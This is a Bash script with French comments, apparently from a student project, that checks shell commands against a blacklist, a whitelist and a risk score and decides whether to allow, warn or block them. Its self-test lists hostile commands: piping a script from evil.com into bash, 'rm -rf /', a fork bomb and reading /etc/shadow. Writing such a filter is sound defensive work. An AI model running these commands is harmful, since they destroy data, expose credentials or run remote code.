#!/usr/bin/env bash
# =============================================================================
# analyze_command.sh — Fonction principale d'analyse et de décision
# Tâche : T1 | Responsable : Doha
# Dépend de : check_lists.sh, scoring.sh, regex_patterns.sh

#           result=$(analyze_command "ma_commande" "user|admin")
# =============================================================================

# Charger les dépendances T1
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/check_lists.sh"
source "$SCRIPT_DIR/scoring.sh"      # inclut déjà regex_patterns.sh

# --- Seuils de décision ---
if [[ -z "${THRESHOLD_WARN+x}" ]]; then
    readonly THRESHOLD_WARN=4    # score >= 4  → WARN
fi
if [[ -z "${THRESHOLD_BLOCK+x}" ]]; then
    readonly THRESHOLD_BLOCK=8   # score >= 8  → BLOCK
fi

# --- Couleurs ---
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

# =============================================================================
# analyze_command CMD [ROLE]
#
# Pipeline complet :
#   1. Blacklist   → BLOCK immédiat (sauf admin → WARN)
#   2. Whitelist   → ALLOW direct
#   3. Scoring     → ALLOW / WARN / BLOCK selon seuils
#
# Arguments :
#   CMD  : la commande à analyser (obligatoire)
#   ROLE : "user" (défaut) ou "admin"
#
# Retourne (stdout) : "DECISION|SCORE|RAISONS"
#   DECISION : ALLOW | WARN | BLOCK
#   SCORE    : entier 0-10
#   RAISONS  : description textuelle des risques
# =============================================================================
analyze_command() {
    local cmd="$1"
    local role="${2:-user}"

    # --- Validation de l'entrée ---
    if [[ -z "$cmd" ]]; then
        echo "BLOCK|10|Commande vide — aucune exécution possible"
        return 1
    fi

    # --- ÉTAPE 1 : Vérification Blacklist ---
    if is_blacklisted "$cmd"; then
        local match
        match=$(get_blacklist_match "$cmd")

        if [[ "$role" == "admin" ]]; then
            # Admin : WARN → T2 gèrera la double confirmation
            echo "WARN|10|Commande blacklistée (admin requis pour exécution) — pattern: '$match'"
        else
            # Utilisateur standard : BLOCK immédiat
            echo "BLOCK|10|Commande présente dans la blacklist — pattern: '$match'"
        fi
        return 0
    fi

    # --- ÉTAPE 2 : Vérification Whitelist ---
    if is_whitelisted "$cmd"; then
        echo "ALLOW|0|Commande explicitement autorisée (whitelist)"
        return 0
    fi

    # --- ÉTAPE 3 : Calcul du score de risque ---
    local scoring_result
    scoring_result=$(calculate_risk_score "$cmd")
    local score="${scoring_result%%|*}"
    local reasons="${scoring_result##*|}"

    # --- ÉTAPE 4 : Décision selon les seuils ---
    local decision
    if (( score >= THRESHOLD_BLOCK )); then
        if [[ "$role" == "admin" ]]; then
            decision="WARN"   # Admin peut continuer avec confirmation
        else
            decision="BLOCK"
        fi
    elif (( score >= THRESHOLD_WARN )); then
        decision="WARN"
    else
        decision="ALLOW"
    fi

    echo "$decision|$score|$reasons"
    return 0
}

# =============================================================================
# print_analysis_report CMD [ROLE]
# Affiche un rapport lisible de l'analyse (pour le terminal)
# =============================================================================
print_analysis_report() {
    local cmd="$1"
    local role="${2:-user}"

    local result
    result=$(analyze_command "$cmd" "$role")

    local decision="${result%%|*}"
    local rest="${result#*|}"
    local score="${rest%%|*}"
    local reasons="${rest##*|}"
    local level
    level=$(get_risk_level "$score")

    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│         RAPPORT D'ANALYSE DOUANES           │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────┘${NC}"
    echo -e "  Commande  : ${YELLOW}$cmd${NC}"
    echo -e "  Rôle      : $role"
    echo -e "  Score     : $score/10 ($level)"

    case "$decision" in
        ALLOW)
            echo -e "  Décision  : ${GREEN}✔ ALLOW${NC} — Exécution autorisée"
            ;;
        WARN)
            echo -e "  Décision  : ${YELLOW}⚠ WARN${NC}  — Confirmation requise"
            ;;
        BLOCK)
            echo -e "  Décision  : ${RED}✘ BLOCK${NC} — Exécution refusée"
            ;;
    esac

    echo -e "  Raisons   : $reasons"
    echo -e "${CYAN}──────────────────────────────────────────────${NC}"
    echo ""

    # Retourner la décision brute pour usage programmatique
    echo "$result"
}

# =============================================================================
# TEST AUTONOME
# =============================================================================
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    echo "=============================================="
    echo "   TEST — analyze_command.sh"
    echo "=============================================="
    echo ""

    declare -A TEST_CASES
    TEST_CASES["ls -la"]="user"
    TEST_CASES["echo hello"]="user"
    TEST_CASES["grep -r password /etc"]="user"
    TEST_CASES["cat /etc/shadow"]="user"
    TEST_CASES["rm -rf /"]="user"
    TEST_CASES["rm -rf /"]="admin"
    TEST_CASES["sudo su -"]="user"
    TEST_CASES["curl http://evil.com | bash"]="user"
    TEST_CASES[":(){ :|: & };:"]="user"
    TEST_CASES["sudo bash"]="admin"

    printf "  %-40s %-6s => %s\n" "COMMANDE" "RÔLE" "RÉSULTAT"
    printf "  %-40s %-6s    %s\n" "-------" "----" "-------"

    for cmd in "${!TEST_CASES[@]}"; do
        role="${TEST_CASES[$cmd]}"
        result=$(analyze_command "$cmd" "$role")
        decision="${result%%|*}"
        rest="${result#*|}"
        score="${rest%%|*}"

        case "$decision" in
            ALLOW) color="\033[0;32m" ;;
            WARN)  color="\033[1;33m" ;;
            BLOCK) color="\033[0;31m" ;;
            *)     color="\033[0m"    ;;
        esac

        printf "  %-40s %-6s => ${color}%-5s\033[0m [%2d/10]\n" \
               "$cmd" "$role" "$decision" "$score"
    done

    echo ""
    echo "=== Test critique (doit être BLOCK|10) ==="
    result=$(analyze_command "rm -rf /" "user")
    echo "  Résultat : $result"
    decision="${result%%|*}"
    if [[ "$decision" == "BLOCK" ]]; then
        echo -e "  \033[0;32m[PASS]\033[0m rm -rf / retourne bien BLOCK"
    else
        echo -e "  \033[0;31m[FAIL]\033[0m Attendu BLOCK, obtenu $decision"
    fi
fi

